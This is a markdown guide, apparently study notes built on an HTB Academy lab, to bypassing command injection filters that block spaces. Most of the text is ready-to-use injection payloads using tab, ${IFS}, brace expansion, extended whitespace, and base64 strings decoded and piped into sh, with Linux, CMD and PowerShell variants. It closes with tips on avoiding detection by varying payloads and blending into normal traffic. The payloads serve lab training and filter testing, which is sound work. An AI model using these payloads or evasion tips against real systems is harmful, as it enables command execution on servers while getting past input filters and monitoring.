# 🛰️ Space Filter Bypass Techniques

## Introduction
[!INFO] This document provides a detailed guide to bypassing command injection filters that block space characters. It includes various methods and techniques, along with comprehensive examples for different environments.

---

## Commonly Allowed Extended Characters
[!NOTE]
The following extended characters can be used as substitutes for spaces when they are not filtered:

| **Character** | **Hex Code** | **Interpretation** |
|---------------|--------------|--------------------|
| `\r`          | `%0d`        | Carriage return     |
| `\v`          | `%0b`        | Vertical tab        |
| `\f`          | `%0c`        | Form feed           |

### Testing Extended Characters
[!EXAMPLE]
```http
# Vertical tab injection
ip=127.0.0.1%0awhoami%0blest

# Form feed injection
ip=127.0.0.1%0awhoami%0clists

# Combined separators
ip=127.0.0.1%0awhoami%09%0cls -la
```

---

## HTB Academy Lab Solution

### Challenge Requirements
[!INFO] The task is to execute the command `ls -la` and find the size of the `index.php` file.

**Known Constraints:**
- Newline (`\n`/`%0a`) injection operator works.
- Space characters are blacklisted.
- Need to bypass space in `ls -la`.

### Solution Approaches
[!CHECK]
#### Method 1: Tab Character Bypass
```http
ip=127.0.0.1%0als%09-la
```

#### Method 2: IFS Variable Bypass
```http
ip=127.0.0.1%0als${IFS}-la
# URL encoded: ip=127.0.0.1%0als%24%7bIFS%7d-la
```

#### Method 3: Brace Expansion Bypass
```http
ip=127.0.0.1%0a{ls,-la}
```

### Expected Output Analysis
[!SUCCESS]
**Command Output:**
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.074 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms

total 20
drwxr-xr-x 2 www-data www-data 4096 Jul 13 10:30 .
drwxr-xr-x 3 www-data www-data 4096 Jul 13 10:30 ..
-rw-r--r-- 1 www-data www-data 1613 Jul 13 10:30 index.php
-rw-r--r-- 1 www-data www-data 842 Jul 13 10:30 style.css
```

**File Size Identification:**
- **index.php**: 1613 bytes
- **style.css**: 842 bytes

**Answer:** `1613`

---

## Advanced Bypass Combinations

### Multi-Method Combinations
[!EXAMPLE]
```bash
# IFS + Brace expansion
{echo,${IFS},"Hello World"}

# Tab + Variable assignment
cmd=ls%09-la;$cmd

# Base64 + IFS
echo${IFS}bHMgLWxhCg==|base64${IFS}-d|sh
```

### Platform-Specific Methods
[!NOTE]
**Linux-Specific:**
```bash
# Process substitution
cat<(ls -la)

# Command substitution with IFS
$(echo${IFS}ls${IFS}-la)

# Here-string
cat<<<"ls -la"
```

**Windows CMD:**
```cmd
# Caret escape character
ls^-la

# Variable expansion
set cmd=ls -la && %cmd%
```

**Windows PowerShell:**
```powershell
# Tick escape
ls`-la

# String expansion
"ls -la" | Invoke-Expression
```

---

## Systematic Testing Methodology

### Step-by-Step Approach
[!CHECK]
#### Phase 1: Confirm Working Injection
```http
# Verify injection operator works
ip=127.0.0.1%0a
# Result: ✅ Normal ping output
```

#### Phase 2: Test Space Alternatives
```http
# Test each bypass method
ip=127.0.0.1%0awhoami%09    # Tab
ip=127.0.0.1%0awhoami${IFS} # IFS
ip=127.0.0.1%0a{whoami}     # Brace expansion
```

#### Phase 3: Execute Target Command
```http
# Apply working bypass to target command
ip=127.0.0.1%0a{ls,-la}
```

#### Phase 4: Parse Results
```bash
# Extract required information from output
# Look for specific files and their sizes
```

### Payload Development Template
[!SUCCESS]
**Progressive Complexity:**
```bash
# Level 1: Basic injection
127.0.0.1%0acommand

# Level 2: Single argument
127.0.0.1%0acommand%09arg

# Level 3: Multiple arguments  
127.0.0.1%0a{command,arg1,arg2}

# Level 4: Complex operations
127.0.0.1%0aecho${IFS}payload|base64${IFS}-d|sh
```

---

## Comprehensive Reference Table

### Space Bypass Methods Comparison
[!INFO]
| **Method** | **Syntax** | **URL Encoded** | **Platform** | **Reliability** |
|------------|------------|-----------------|--------------|-----------------|
| **Tab**    | `\t`       | `%09`           | Universal    | High            |
| **IFS Variable** | `${IFS}`         | `%24%7bIFS%7d` | Unix/Linux      | High            |
| **Brace Expansion** | `{cmd,arg}`      | `%7bcmd,arg%7d` | Bash            | Medium          |
| **Vertical Tab**   | `\v`             | `%0b`         | Universal       | Medium          |
| **Form Feed**      | `\f`             | `%0c`         | Universal       | Low             |
| **Base64**         | `echo X\|base64 -d\|sh`     | Complex        | Unix/Linux      | Medium          |
| **Hex Encoding**   | `printf "cmd\x20arg"`       | Complex        | Unix/Linux      | Medium          |
| **Redirection**    | `cat<file`         | `cat%3cfile`  | Unix/Linux      | High            |

### Selection Strategy
[!NOTE]
**Primary Methods (High Success Rate):**
1. **Tab character** (`%09`) - Universal compatibility.
2. **IFS variable** (`${IFS}`) - Reliable on Unix/Linux.
3. **Brace expansion** (`{cmd,arg}`) - Clean syntax.

**Fallback Methods:**
1. **Extended whitespace** (`%0b`, `%0c`) - When primary blocked.
2. **Encoding methods** - When characters are heavily filtered.
3. **Platform-specific** - When environment is known.

---

## Detection Evasion Tips

### Stealth Considerations
[!WARNING]
- Avoid Common Patterns: Don't always use the same bypass method; vary payload structure between requests.
- Blend with Normal Traffic: Use realistic command arguments and avoid obviously malicious commands.
- Error Handling:
```bash
# Graceful degradation
{ls,-la}||{dir,/w}||echo${IFS}"fallback"
```

### Payload Obfuscation
[!EXAMPLE]
**Multi-Layer Encoding:**
```bash
# Double encoding
echo cHdkCg== | base64 -d | sh

# Mixed methods
{echo,${IFS},cHdkCg==}|base64${IFS}-d|sh
```

This comprehensive guide to space filter bypasses provides multiple reliable methods for maintaining command injection capabilities even when space characters are blacklisted, ensuring successful exploitation across various filtering scenarios.